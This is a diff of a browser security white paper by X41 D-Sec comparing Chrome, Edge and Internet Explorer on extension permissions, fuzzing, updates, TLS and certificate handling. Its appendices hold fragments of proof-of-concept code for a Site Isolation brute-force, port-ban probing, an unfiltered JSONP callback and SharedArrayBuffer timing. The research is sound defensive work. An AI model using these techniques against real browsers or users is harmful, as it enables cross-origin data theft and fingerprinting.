 As discussed in the Enterprise Features chapter, sysadmins can configure Google Chrome default content
 setting permissions as well as extensions in a centralized way. This makes it very easy to enforce that only
@@ -6831,8 +5489,6 @@ usability but could eventually lower security. An example of that was discussed 
 when mentioning SCF files that were auto downloaded by Google Chrome and could be used by attackers
 to extract Windows credentials via an SMB remote resource.
 
-
-
 15.2        BROWSER EXTENSIONS CONSIDERATIONS
 
 When browser extensions are installed, the permissions requested by the extension are displayed in a
@@ -6840,12 +5496,8 @@ dialog. From a usability perspective, since permissions are simple strings in a 
 dialogue should have a concise explanation of what are the consequences of having some permissions.
 However, not all permissions correspond to an entry in the dialog.
 
-
 X41 D-SEC GmbH                                                                                   Page 141 of 197
 Browser Security White Paper
-
-
-
 
 The next two figures show an example of the same extension with different permissions. The first case
 of figure 15.5 shows more permissions being requested, however in the second case of figure 15.6 the
@@ -6855,16 +5507,9 @@ background, storage, webRequest and cookie permissions. The information provided
 enough for the non-technical end user that does not want to investigate the manifest file manually to know
 that extension will have more access than what is actually displayed in the dialog.
 
-
-
-
                                Figure 15.5: Extension asking for a number of permissions
 
-
-
-
            Figure 15.6: The same extension asking for less permissions while still being potentially malicious
-
 
 From a usability perspective, there is practically no difference in the permissions dialogue for a very famous
 extension used by millions of users such as AdBlock, and the one from the malicious extension created as
@@ -6874,18 +5519,10 @@ figure 15.7 AdBlock looks potentially more intrusive than the fake Adobe Flash U
 there is no information for the user regarding the fact the second extension is malicious and will make any
 tabs open controlled via BeEF.
 
-
-
-
 X41 D-SEC GmbH                                                                                            Page 142 of 197
 Browser Security White Paper
 
-
-
-
            Figure 15.7: Permission dialogue comparison between AdBlock and the fake Adobe Flash Update
-
-
 
 15.3        ADDRESS BAR CONSIDERATIONS
 
@@ -6914,17 +5551,10 @@ color, which appears only with EV-SSL ones.
    2 https://www.chromium.org/developers/design-documents/idn-in-google-chrome
    3 https://www.xudongz.com/blog/2017/idn-phishing/
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 143 of 197
 Browser Security White Paper
 
-
-
-
                                   Figure 15.8: Browser address bar comparison
-
 
 Google Chrome behaves differently, using both the padlock and the green color for all types of SSL sites
 (unless mixed content is affecting the site). Moreover, it is the only browser that alerts the user if the
@@ -6933,9 +5563,6 @@ cards, and other sensitive information over HTTP.
 
 Google Chrome has the most intuitive and informative browser address bar, and an higher usability than
 the other browser analyzed.
-
-
-
 
 X41 D-SEC GmbH                                                                                      Page 144 of 197
 16           Fuzzing and Automated Testing
@@ -6949,8 +5576,6 @@ Ad-hoc fuzzing of web browsers has been done since at least the early 2000s by i
 Over the years, some efforts have grown to be more systematic, continuous and large-scaled. All tested
 browsers were found to be subject to fuzzing by their vendors as well as third parties at the time of this
 report.
-
-
 
 16.1      THIRD-PARTY FUZZING
 
@@ -6972,13 +5597,8 @@ an end-user. Unfortunately, the fact that these third parties want to keep their
 are the hardest to get any data for: we simply do not know the number of people involved, the effectiveness
 of their fuzzers, or the scale at which their fuzzers are run.
 
-
-
                                                      145
 Browser Security White Paper
-
-
-
 
 The effectiveness of third-party fuzzing depends on various variables. First of all, the ability to detect issues
 triggered by fuzzing is paramount. For memory corruption issues, this can be done by adding additional
@@ -7025,14 +5645,8 @@ versions from .15063 onward. It does not allow manual debugging of Microsoft Edg
    5 https://github.com/SkyLined/EdgeDbg
    6 https://github.com/SkyLined/BugId
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 146 of 197
 Browser Security White Paper
-
-
-
 
 detect and analyze crashes during fuzzing.
 
@@ -7044,7 +5658,6 @@ possible. If most people are fuzzing multiple browsers, their skill level should
 The third factor is the ability to effectively target various browser features. This can be broken down into
 several things:
 
-
     • the availability of documentation for these features that provides useful insight into how they should
        operate and what security guarantees they are expected to provide
 
@@ -7053,7 +5666,6 @@ several things:
 
     • the availability of builds that provide feedback on the effectiveness of fuzzing and/or feedback that
        can be used to guide fuzzing in a way that increases the coverage and effectiveness.
-
 
 The most important difference between the subjects of this paper is of course the availability of source
 code and a build-system for the most relevant parts of Google Chrome, where Microsoft Edge and Internet
@@ -7081,12 +5693,8 @@ apply to the most well funded attackers.
 
 The ability to use the source code as guidance while developing fuzzers, and create instrumented builds has
 
-
 X41 D-SEC GmbH                                                                                        Page 147 of 197
 Browser Security White Paper
-
-
-
 
 made it easier for third parties to fuzz Google Chrome effectively than the closed source Microsoft Edge
 and Internet Explorer browser. The lack of tools to easily debug all processes related to the most recent
@@ -7095,8 +5703,6 @@ their fuzzers. X41 D-Sec GmbH believes that third-party fuzzing improves the sec
 long run, and that all browsers has been around long enough for this to have taken effect. Google Chrome
 will have had more benefit from this than either Microsoft Edge or Internet Explorer, as it is easier to fuzz
 effectively for the above reasons.
-
-
 
 16.2        VENDOR FUZZING EFFORTS - GOOGLE CHROME
 
@@ -7111,15 +5717,11 @@ effective fuzzers to run these fuzzers on their systems and rewards the reporter
 the process. This allows the external reporter to take advantage of the fuzzing infrastructure available to
 Google, vastly improving the number of issues they can find in a given time-frame.
 
-
-
 16.3        VENDOR FUZZING EFFORTS - MICROSOFT EDGE AND INTERNET EX-
              PLORER
 
-
 According to a blogpost8 from 2016 by Microsoft, the Microsoft Edge and Internet Explorer browsers were
 subject to fuzzing in order to eliminate vulnerabilities before release:
-
 
        We’ve devoted more than 670 machine-years to fuzz testing Microsoft Edge and Internet
        Explorer during product development, including monitoring for possible exceptions such as
@@ -7127,29 +5729,19 @@ subject to fuzzing in order to eliminate vulnerabilities before release:
        from 1-billion HTML files. Because of all of this, hundreds of security issues were addressed
        before the product shipped.
 
-
 Microsoft does not currently publish any statistics about their ongoing fuzzing efforts for Microsoft Edge
 and Internet Explorer.
    7 https://github.com/google/oss-fuzz
    8 https://docs.microsoft.com/en-us/microsoft-edge/deploy/security-enhancements-microsoft-edge
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 148 of 197
 Browser Security White Paper
-
-
-
 
 Assuming that the "machine-years" mentioned by Microsoft refer to single core machines, and that Mi-
 crosoft uses the same number of cores as Google, Microsoft Edge could have been fuzzed for 670 machine-
 years in roughly 16 days. In contrast, Google has been fuzzing Google Chrome continuously for years. This
 suggests that Microsoft’s fuzzing efforts for Microsoft Edge pale in comparison to Google’s efforts for
 Google Chrome.
-
-
-
 
 X41 D-SEC GmbH                                                                               Page 149 of 197
 17           Updates
@@ -7165,16 +5757,12 @@ to attack the HTTPS stack, as well as the update implementation. By encapsulatin
 instead of HTTP, the TLS implementation needs to be circumvented first, before the updater itself could be
 attacked.
 
-
-
 17.1        GOOGLE CHROME
 
 For Google Chrome browsers, the GoogleUpdateCore.exe handles the update process, via the Omaha pro-
 tocol1 , which is partly open sourced2 . Downloads are retrieved from a CDN (redirector.gvt1.com) via
 HTTP. The Omaha protocol uses Client-Update Protocol (CUP)3 to ensure trusted downloads even when
 HTTPS is not available, by exchanging signed hashes of the files to be downloaded.
-
-
 
 17.2        MICROSOFT EDGE AND INTERNET EXPLORER
 
@@ -7187,19 +5775,13 @@ disabling. The update process is controlled by wuauclt.exe. Additionally to down
   2 https://github.com/google/omaha
   3 https://github.com/google/omaha/blob/master/doc/cup.html
 
-
-
                                                     150
 Browser Security White Paper
-
-
-
 
 servers, Microsoft Windows 10 additionally uses a Peer to Peer (P2P) network approach called Windows
 Update Delivery Optimization to spread updates faster4 (Background Intelligent Transfer Service (BITS)
 protocol). Microsoft updates are downloaded by a combination of HTTP and HTTPS requests to different
 hosts5 .
-
 
     • http://windowsupdate.microsoft.com
 
@@ -7223,17 +5805,11 @@ hosts5 .
 
     • http://ntservicepack.microsoft.com
 
-
 The actual download of the packages happens via HTTP, similar to the Google Chrome update process.
-
-
-
 
    4 https://docs.microsoft.com/en-us/windows/configuration/manage-connections-from-windows-operating-syste
 m-components-to-microsoft-services#bkmk-updates
   5 https://technet.microsoft.com/en-us/library/bb693717.aspx
-
-
 
 X41 D-SEC GmbH                                                                                 Page 151 of 197
 18            Cryptography
@@ -7257,12 +5833,8 @@ The tested browsers are identified by their User-Agent string, as shown in table
 
                                                Table 18.1: Browser User Agents
 
-
-
 As expected no browser is vulnerable to the three prominent SSL and TLS vulnerabilities Logjam2 , FREAK 3 ,
 and POODLE4 .
-
-
 
 18.1      SUPPORTED PROTOCOLS
 
@@ -7271,14 +5843,8 @@ and POODLE4 .
   3 https://www.freakattack.com
   4 https://security.googleblog.com/2014/10/this-poodle-bites-exploiting-ssl-30.html
 
-
-
-
                                                               152
 Browser Security White Paper
-
-
-
 
                                 Protocol   Google Chrome   Microsoft Edge   Internet Explorer
 
@@ -7292,12 +5858,9 @@ Browser Security White Paper
              Table 18.2: Secure Transport Protocols Supported by Browsers ( - True, # - False, G
                                                                                                # - Partly)
 
-
 All browsers reject the insecure protocols SSL version 2 and version 3 (see table 18.2), and all browsers
 support TLS versions 1.0, 1.1, and 1.2. No browser supports the draft version of TLS version 1.3. Support
 for version 1.3 is under active development56 in Google Chrome, Microsoft Edge, and Internet Explorer.
-
-
 
 18.1.1       Downgrade Attacks
 
@@ -7331,27 +5894,15 @@ n-tls-false-start-and-tls-1-3/
 csv
   9 https://tools.ietf.org/html/rfc5246#section-7.4.9
 
-
-
-
 X41 D-SEC GmbH                                                                                          Page 153 of 197
 Browser Security White Paper
-
-
-
 
 compromised by an attacker capable of creating a valid signature on this message. We do not consider this
 to be very probable given the quality of the ciphers present in all tested browsers. It should be kept in mind
 as a limiting factor during security considerations regarding a SCSV.
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 154 of 197
 Browser Security White Paper
-
-
-
 
 18.2        SUPPORTED CIPHER SUITES
 
@@ -7398,7 +5949,6 @@ Browser Security White Paper
                   Table 18.3: Cipher Suites Supported by each Browser ( - True, # - False, G
                                                                                            # - Partly)
 
-
 As shown in table 18.3, all browsers support cipher suites that are considered secure at the time of writing.
 They prefer strong ciphers over weaker ones. The first choice of Google Chrome is the TLS_GREASE_5A
 (0x8a8a) mechanism which is designed10 to prevent extensibility failures. It is considered irrelevant for
@@ -7411,14 +5961,8 @@ In contrast to Microsoft Edge and Internet Explorer, which support 19 different 
 Chrome supports only 14. Since the suites supported by Google Chrome are considered secure, having
  10 https://tools.ietf.org/html/draft-davidben-tls-grease-01
 
-
-
-
 X41 D-SEC GmbH                                                                                                Page 155 of 197
 Browser Security White Paper
-
-
-
 
 fewer cipher implementations can only serve to reduce complexity and reduces attack surface. Except
 for three cipher suites, Microsoft Edge and Internet Explorer supported all the cipher suites that Google
@@ -7432,7 +5976,6 @@ are based on the same Secure Channel implementation with identical configuration
 
 When analyzing transport encryption, authentication, and integrity mechanisms, the following cipher and
 protocol properties are important:
-
 
     • Forward Secrecy: Even if the private keys are leaked at some point in time, attackers cannot decrypt
        past communications.
@@ -7473,17 +6016,11 @@ protocol properties are important:
               TLS_RSA_WITH_AES_256_CBC_SHA (0x35)           #                 #      #
               TLS_RSA_WITH_AES_128_CBC_SHA (0x2f)           #                 #      #
 
-
  11 https://blog.qualys.com/ssllabs/2016/11/16/announcing-ssl-labs-grading-changes-for-2017
  12 https://sweet32.info
 
-
-
 X41 D-SEC GmbH                                                                                             Page 156 of 197
 Browser Security White Paper
-
-
-
 
               TLS_RSA_WITH_3DES_EDE_CBC_SHA (0xa) WEAK          #                    #         #
               (112 effective)
@@ -7496,8 +6033,6 @@ Browser Security White Paper
                   Table 18.4: Cipher Suites Supported by each Browser ( - True, # - False, G
                                                                                            # - Partly)
 
-
-
 As shown in table 18.4, all browsers support the Galois/Counter Mode (GCM) cipher mode for the Advanced
 Encryption Standard (AES) and forward secrecy. GCM also provides Authenticated Encryption with Associ-
 ated Data (AEAD). Additionally, Google Chrome supports the more modern ChaCha2013 cipher with the
@@ -7509,8 +6044,6 @@ However, TLS 1.2 using AEAD_CHACHA20_POLY1305 as specified by RFC790518 prevents
 nonces which makes it resistant against nonce misuse. We consider resistance against nonce reuse attacks
 important in terms of security since implementation flaws have been reported19 in the past regarding
 incorrect usage of nonces.
-
-
 
 18.3        SUPPORTED SIGNATURE ALGORITHMS
 
@@ -7532,7 +6065,6 @@ incorrect usage of nonces.
                          Table 18.5: Browser Signature Algorithms ( - True, # - False, G
                                                                                        # - Partly)
 
-
  13 https://tools.ietf.org/html/rfc7539
  14 https://www.imperialviolet.org/2013/10/07/chacha20.html
  15 https://eprint.iacr.org/2007/472
@@ -7541,14 +6073,8 @@ incorrect usage of nonces.
  18 https://tools.ietf.org/html/rfc7905
  19 https://eprint.iacr.org/2016/475.pdf
 
-
-
-
 X41 D-SEC GmbH                                                                                           Page 157 of 197
 Browser Security White Paper
-
-
-
 
 All browsers supported the standard signature algorithms of the Secure Hashing Algorithm (SHA) family
 (see table 18.5), which are used to sign X.50920 certificates. No browser supports Secure Hashing Algorithm
@@ -7566,34 +6092,18 @@ enterprise contexts using insecure SHA-1 signatures will not display any warning
 It was also verified that all the three browsers display a warning when they encounter a certificate signed
 using SHA-1.
 
-
-
-
                                Figure 18.1: SHA-1 Certificate Warning in Google Chrome
-
-
-
 
  20 http://www.itu.int/rec/T-REC-X.509/en
  21 https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html
  22 https://blogs.windows.com/msedgedev/2016/11/18/countdown-to-sha-1-deprecation/
 
-
-
 X41 D-SEC GmbH                                                                                    Page 158 of 197
 Browser Security White Paper
 
-
-
-
                                            Figure 18.2: SHA-1 Warning in Microsoft Edge
 
-
-
-
                                            Figure 18.3: SHA Warning in Internet Explorer
-
-
 
 18.4        PROTOCOL FEATURES
 
@@ -7615,14 +6125,8 @@ Browser Security White Paper
                                   Table 18.6: Protocol Features ( - True, # - False, G
                                                                                      # - Partly)
 
-
-
-
 X41 D-SEC GmbH                                                                                                               Page 159 of 197
 Browser Security White Paper
-
-
-
 
 18.5        MIXED CONTENT ENABLED
 
@@ -7638,12 +6142,9 @@ Browser Security White Paper
                                     Table 18.7: Mixed Content ( - True, # - False, G
                                                                                    # - Partly)
 
-
 In contrast to Internet Explorer, Google Chrome and Microsoft Edge support the “Upgrade Insecure
 Requests”23 request header. This header indicates that the client prefers an encrypted and authenticated
 response. This is closely related to HTTP Strict Transport Security (HSTS) and CSP.
-
-
 
 18.6        CERTIFICATE SECURITY FOR TLS
 
@@ -7654,15 +6155,11 @@ unauthorized certificates for any website and subvert the security offered by SS
 Google Chrome, where the Chrome Web Store is implemented as a website and depends on certificates for
 security, the security of this system is vital.
 
-
-
 18.6.1       Choices of Certificate Authorities
 
 All browsers use the Microsoft Windows certificate store on Microsoft Windows 10 to validate server
 certificates for websites. Google Chrome has added features like key pinning and certificate transparency
 that mitigate attacks using a compromised or malicious CA.
-
-
 
 18.6.2       Public Key Pinning
 
@@ -7674,14 +6171,8 @@ dedicated HTTP header.
  24 https://www.imperialviolet.org/2011/05/04/pinning.html
  25 https://tools.ietf.org/html/rfc7469
 
-
-
-
 X41 D-SEC GmbH                                                                                                Page 160 of 197
 Browser Security White Paper
-
-
-
 
 As table 18.8 shows HPKP is only supported by Google Chrome at the time of writing. It is currently under
 consideration26 for Microsoft Edge.
@@ -7693,14 +6184,11 @@ consideration26 for Microsoft Edge.
                                  Table 18.8: HPKP Support ( - True, # - False, G
                                                                                # - Partly)
 
-
-
 Google Chrome has a built-in list27 of known root certificate hashes. If one of these certificates is the
 root of a certificate chain for a server, Google Chrome will check for certificate public key pinning. If it
 is not the root, but a private trust anchor, no certificate pinning checks will be performed. According to
 the documentation28 this is to avoid problems with products that intercept SSL / TLS. According to the
 documentation pin validation will not be performed in this case:
-
 
        Chrome does not perform pin validation when the certificate chain chains up to a private trust
        anchor. A key result of this policy is that private trust anchors can be used to proxy (or MITM)
@@ -7711,7 +6199,6 @@ documentation pin validation will not be performed in this case:
        under the control of the person who controls the proxy (e.g. the enterprise’s IT administrator). If
        the client does not trust the private trust anchor, the proxy’s attempt to mediate the connection
        will fail as it should.
-
 
 We confirmed this behaviour by creating a trusted root CA in the Microsoft Windows trusted certificate
 store and an additional intermediate CA used by Burp Proxy29 to intercept TLS connections. As shown
@@ -7734,17 +6221,10 @@ ocal-proxies-and-filters-
  30 http://www.zdnet.com/article/lenovo-accused-of-pushing-superfish-self-signed-mitm-proxy/
  31 https://docs.microsoft.com/en-us/windows/access-protection/enterprise-certificate-pinning
 
-
-
-
 X41 D-SEC GmbH                                                                                       Page 161 of 197
 Browser Security White Paper
 
-
-
-
                                 Figure 18.4: SSL Interception in Google Chrome
-
 
 18.6.3       Certificate Transparency
 
@@ -7769,14 +6249,8 @@ In general, we consider CT as beneficial since it should effectively prevent hid
 a-policy/CTPolicyMay2016edition.pdf
  33 https://www.certificate-transparency.org/ev-ct-plan
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 162 of 197
 Browser Security White Paper
-
-
-
 
 a CA. However, this should be combined with methods to warn users immediately when attacks occur.
 One example would be a security check that notices when a CA for a certain domain has changed. An
@@ -7789,14 +6263,10 @@ subsequently this leads to an error or a warning.
 We would like to advise Microsoft Edge and Internet Explorer to implement CT in order to make attacks
 against authentication mechanisms in browsers more detectable.
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 163 of 197
 19          Acknowledgements
 
 We like to thank the following people and organisations for their support (in alphabetical order):
-
 
    • Arrigo Triulzi
 
@@ -7810,9 +6280,6 @@ We like to thank the following people and organisations for their support (in al
 
    • Marc Ruef
 
-
-
-
                                                    164
 20           About X41 D-Sec GmbH
 
@@ -7825,15 +6292,10 @@ Fields of expertise in the area of application security are code reviews, binary
 vulnerability discovery. Custom research and high quality IT security services are core competencies of
 X41.
 
-
-
-
                                                       165
 21           Project Team
 
 The following team of experts in the field of browser security have been working on this project.
-
-
 
 MARKUS VERVIER
 
@@ -7841,10 +6303,7 @@ Markus Vervier is Head of Research and CEO at X41 D-Sec GmbH. Software security 
 work. During the last 15 years he collected professional experience in offensive IT security working as a
 security researcher and penetration tester for highly regarded companies.
 
-
-
 His experience in the field of security includes:
-
 
    • Extensive experience in the field of code-review, reverse engineering, and vulnerability analysis of
       applications on various platforms and architectures.
@@ -7859,8 +6318,6 @@ His experience in the field of security includes:
 
    • Memory corruption vulnerability in libOTR2 .
 
-
-
 MICHELE ORRÙ
 
 Michele is a security consultant with over nine years of experience in penetration testing, source code
@@ -7868,16 +6325,10 @@ auditing and DevOps. During the last five years his focus has been on phishing a
   1 https://pwnaccelerator.github.io/2016/signal-part1.html
   2 https://x41-dsec.de/lab/advisories/x41-2016-001-libotr/
 
-
-
                                                      166
 Browser Security White Paper
 
-
-
-
 His experience in the field of security includes:
-
 
     • Co-author of The Browser Hacker’s Handbook
 
@@ -7888,17 +6339,12 @@ His experience in the field of security includes:
     • Speaker at KiwiCon, RuxCon, ZeroNights, OWASP AppSec, HackPra AllStars and InsomniHack
        security conferences about browser security.
 
-
-
 ERIC SESTERHENN
 
 Eric Sesterhenn is working as an IT Security consultant for more than 14 years, working mostly in the areas
 of penetration testing and source code auditing.
 
-
-
 His experience in the field of security includes:
-
 
     • Identified vulnerabilities in various software projects including the Linux kernel.
 
@@ -7909,29 +6355,19 @@ His experience in the field of security includes:
 
     • Speaker at 30C3 about fingerprinting Java applications (lightning talk).
 
-
-
 BEREND-JAN WEVER
 
 Berend-Jan Wever is a Principal Security Researcher at X41 D-Sec GmbH. He is interested in almost
 anything related to Computer and Information Security, and his main focus has been on web-browsers and
 low-level security issues.
 
-
-
 His experience of 15 years in the field of security includes:
    3 https://beefproject.com
    4 https://github.com/antisnatchor/phishlulz
    5 http://warcon.pl
 
-
-
-
 X41 D-SEC GmbH                                                                                 Page 167 of 197
 Browser Security White Paper
-
-
-
 
     • Extensive experience in code-review, fuzzing, vulnerability analysis, reverse engineering, and exploit
        development on Windows.
@@ -7940,16 +6376,10 @@ Browser Security White Paper
 
     • Member of the Microsoft Secure Windows Initiative Attack Team (SWIAT) from 2006 until 2008.
 
-
-
-
    6 https://bugs.chromium.org/p/chromium/issues/list?can=1&q=berendjanwever%40gmail.com
-
-
 
 X41 D-SEC GmbH                                                                                  Page 168 of 197
 A      Appendix
-
 
 ERRATA
 
@@ -7961,14 +6391,8 @@ ERRATA
 
  • Page 87: Removed comment about bypasses in JavaScript frameworks, pointed out by @shhnjk.
 
-
-
-
                                                169
 Browser Security White Paper
-
-
-
 
 SANDBOX
 
@@ -8032,14 +6456,8 @@ Alphabetical list of known app capabilities SIDs
       SID:S-1-15-3-1024-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053
       Qualified name: NAMED CAPABILITIES\Cellular Device Identity
 
-
-
-
 X41 D-SEC GmbH                                                                                                 Page 170 of 197
 Browser Security White Paper
-
-
-
 
     • cellularMessaging
       SID:S-1-15-3-1024-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263
@@ -8110,13 +6528,8 @@ Browser Security White Paper
       SID:S-1-15-3-1024-373139346-748750918-1948434659-2643498477-4072104851-1007166015-1979446734-3878125657
       Qualified name: NAMED CAPABILITIES\Enterprise Data Policy
 
-
-
 X41 D-SEC GmbH                                                                                                 Page 171 of 197
 Browser Security White Paper
-
-
-
 
     • enterpriseDeviceLockdown
       SID:S-1-15-3-1024-1720708008-676358685-3694961389-3536049837-28312851-1003502039-653286243-2922628565
@@ -8184,14 +6597,8 @@ Browser Security White Paper
     • location
       SID:S-1-15-3-1024-1120341015-4059530845-270443254-1514536596-2315272569-284657971-419501928-776969430
 
-
-
-
 X41 D-SEC GmbH                                                                                                 Page 172 of 197
 Browser Security White Paper
-
-
-
 
     • locationHistory
       SID:S-1-15-3-1024-3029335854-3332959268-2610968494-1944663922-1108717379-267808753-1292335239-2860040626
@@ -8260,14 +6667,8 @@ Browser Security White Paper
     • phoneCallHistoryPublic
       SID:S-1-15-3-1024-1631604711-3604716289-3767720303-698625756-2814662190-970047950-2326260488-1280393717
 
-
-
-
 X41 D-SEC GmbH                                                                                                 Page 173 of 197
 Browser Security White Paper
-
-
-
 
     • phoneCallHistorySystem
       SID:S-1-15-3-1024-2442212369-1516598453-2330995131-3469896071-605735848-2536580394-3691267241-2105387825
@@ -8335,14 +6736,8 @@ Browser Security White Paper
       SID:S-1-15-3-1024-759497869-3426324426-2080302537-280970568-1023192118-597262764-3695343976-1004345243
       Qualified name: NAMED CAPABILITIES\Secondary Authentication Factor
 
-
-
-
 X41 D-SEC GmbH                                                                                                 Page 174 of 197
 Browser Security White Paper
-
-
-
 
     • secureAssessment
       SID:S-1-15-3-1024-1231405757-631568165-502048027-2646382484-613260345-2075369228-3000949285-4219498872
@@ -8411,14 +6806,8 @@ Browser Security White Paper
       SID:S-1-15-3-5
       Qualified name: APPLICATION PACKAGE AUTHORITY\Your videos library
 
-
-
-
 X41 D-SEC GmbH                                                                                                 Page 175 of 197
      Browser Security White Paper
-
-
-
 
          • videosLibrary
            SID:S-1-15-3-5
@@ -8440,9 +6829,6 @@ X41 D-SEC GmbH                                                                  
 
          • xboxAccessoryManagement
            SID:S-1-15-3-1024-316617620-767886417-2031403316-4137648062-386588034-2282218452-745559578-2387228587
-
-
-
 
      Proof-of-Concept code for brute-force attack abusing Site Isolation
 
@@ -8482,13 +6868,8 @@ X41 D-SEC GmbH                                                                  
 32         sDifferentOriginBaseURL = location.protocol + "//" +
 33             sDifferentOriginHost + ":" + location.port + location.pathname;
 
-
-
      X41 D-SEC GmbH                                                                                                Page 176 of 197
      Browser Security White Paper
-
-
-
 
 34     onload = function() {
 35       if (!location.search) {
@@ -8546,13 +6927,8 @@ X41 D-SEC GmbH                                                                  
 87              } catch (e) {};
 88              // Chrome Crash 4
 
-
-
      X41 D-SEC GmbH                                                                          Page 177 of 197
       Browser Security White Paper
-
-
-
 
  89               try {
  90                 var oTextArea = document.createElement("textarea");
@@ -8568,9 +6944,6 @@ X41 D-SEC GmbH                                                                  
 100        };
 101     };
 102   </script>
-
-
-
 
       PORTBANNING TESTING
 
@@ -8604,20 +6977,13 @@ X41 D-SEC GmbH                                                                  
 
  27   connect_to_port();
 
-
-
                                                 Listing A.1: Client-side code
-
 
   1   require 'socket'
   2   @not_banned_ports = ""
 
-
       X41 D-SEC GmbH                                                                  Page 178 of 197
      Browser Security White Paper
-
-
-
 
  3
 
@@ -8679,13 +7045,8 @@ X41 D-SEC GmbH                                                                  
 56       current_port = line.chomp.to_i
 57       if(current_port == port)
 
-
-
      X41 D-SEC GmbH                                                               Page 179 of 197
      Browser Security White Paper
-
-
-
 
 58         # go to next port
 59         port = port + 1
@@ -8702,12 +7063,7 @@ X41 D-SEC GmbH                                                                  
 70     puts "Banned Ports:\n#{banned_ports.join(',')}"
 71   end
 
-
-
                                              Listing A.2: Server-side code
-
-
-
 
      UNFILTERED JSONP CALLBACK RUBY EXAMPLE
 
@@ -8751,12 +7107,8 @@ X41 D-SEC GmbH                                                                  
 31   get '/sameorigin/hidden' do
 32      '<html><head></head>Secret on SameOrigin</body></html>'
 
-
      X41 D-SEC GmbH                                                                                  Page 180 of 197
      Browser Security White Paper
-
-
-
 
 33   end
 34
@@ -8765,12 +7117,7 @@ X41 D-SEC GmbH                                                                  
 36       '<html><head></head>Second Secret on SameOrigin</body></html>'
 37   end
 
-
-
                                         Listing A.3: Unfiltered JSONP Callback
-
-
-
 
      PHISHING
 
@@ -8817,13 +7164,8 @@ X41 D-SEC GmbH                                                                  
 35                   notify(url, cur_count);
 36                   allowed_urls.push(url);
 
-
-
      X41 D-SEC GmbH                                                                                Page 181 of 197
      Browser Security White Paper
-
-
-
 
 37              }
 38     }
@@ -8851,12 +7193,7 @@ X41 D-SEC GmbH                                                                  
 57              },4000);
 58   },2000);
 
-
-
                                                Listing A.4: SafeBrowsing Test
-
-
-
 
      SmartScreen testing
 
@@ -8890,12 +7227,8 @@ X41 D-SEC GmbH                                                                  
 24                     break
 25                 end
 
-
      X41 D-SEC GmbH                                                                                Page 182 of 197
      Browser Security White Paper
-
-
-
 
 26             end
 27
@@ -8941,18 +7274,10 @@ X41 D-SEC GmbH                                                                  
 66       count += 1
 67      end
 
-
-
                                              Listing A.5: SmartScreen Test
-
-
-
 
      X41 D-SEC GmbH                                                                                 Page 183 of 197
      Browser Security White Paper
-
-
-
 
      HIGH RESOLUTION TIMERS
 
@@ -9017,13 +7342,8 @@ X41 D-SEC GmbH                                                                  
 51                   let start = ssharedArray[0]
 52                   // If you want to measure something extend the following promise,
 
-
-
      X41 D-SEC GmbH                                                                      Page 184 of 197
      Browser Security White Paper
-
-
-
 
 53                       // first use our setTimeout sleep to calibrate and find out the ticks per ms,
 54                       // then() measure the subject.
@@ -9070,12 +7390,7 @@ X41 D-SEC GmbH                                                                  
 92            setTimeout(function() { worker.postMessage(sab) }, 1000);
 93   }
 
-
-
                                Listing A.6: Shared Array Buffers + Web Workers Time-Measurement PoC
-
-
-
 
      X41 D-SEC GmbH                                                                                      Page 185 of 197
 Acronyms
@@ -9106,12 +7421,8 @@ CPU Central processing Unit . . . . . . . . . . . . . . . . . . . . . . . . . . 
 CSP Content Security Policy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88
 CSRF Cross-Site Request Forgery . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64
 
-
                                                                                          186
 Browser Security White Paper
-
-
-
 
 CSS Cascading Style Sheets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47
 CT Certificate Transparency . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 162
@@ -9148,12 +7459,8 @@ IPC Inter Process Communication . . . . . . . . . . . . . . . . . . . . . . . . 
 IRC Internet Relay Chat . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88
 JIT Just In Time . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
 
-
 X41 D-SEC GmbH                                                                                                                                                        Page 187 of 197
 Browser Security White Paper
-
-
-
 
 JRE Java Runtime Environment . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90
 JS JavaScript . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69
@@ -9190,12 +7497,8 @@ RPC Remote Procedure Calls . . . . . . . . . . . . . . . . . . . . . . . . . . .
 RTC Real Time Communication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90
 SafeSEH Safe Structured Exception Handling . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79
 
-
 X41 D-SEC GmbH                                                                                                                                                         Page 188 of 197
 Browser Security White Paper
-
-
-
 
 SBX Sandbox Escape . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
 SCF Windows Explorer Command File . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107
@@ -9232,12 +7535,8 @@ vftable Virtual Function Table . . . . . . . . . . . . . . . . . . . . . . . . .
 WASM WebAssembly . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4
